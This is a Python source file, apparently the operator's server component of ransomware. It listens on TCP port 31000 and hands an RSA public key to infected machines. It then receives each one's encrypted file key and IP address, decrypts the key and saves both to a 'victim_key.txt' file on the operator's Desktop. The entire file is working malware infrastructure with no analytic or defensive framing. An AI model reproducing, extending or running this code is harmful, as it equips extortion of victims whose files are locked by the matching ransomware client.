import socket
import os
import random
import sys
import webbrowser
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA

random_file_name = str(random.randint(1, 10000)) + 'victim_key.txt'

class Server:
    def __init__(self):
        self.key = RSA.generate(1024)
        self.desktop = os.path.expanduser('~/Desktop')
        self.pub_key = self.key.publickey()
        self.decryptor = PKCS1_OAEP.new(self.key)
        self.establish_connection()

    def establish_connection(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.bind(('0.0.0.0', 31000))
            sock.listen()
            self.conn, addr = sock.accept()
            self.recv_data()

    def recv_data(self):
        self.conn.send(self.pub_key.export_key())

        cipher_key = self.conn.recv(1024)
        ip_address = self.conn.recv(1024).decode()

        self.victim_key = self.decryptor.decrypt(cipher_key)

        full_data = f'Key - {self.victim_key}\nIP - {ip_address}'

        self.write_data(full_data)

    def write_data(self, data):
        with open(os.path.join(self.desktop, random_file_name), 'w') as f:
            f.write(data)

if __name__ == '__main__':
    Server()
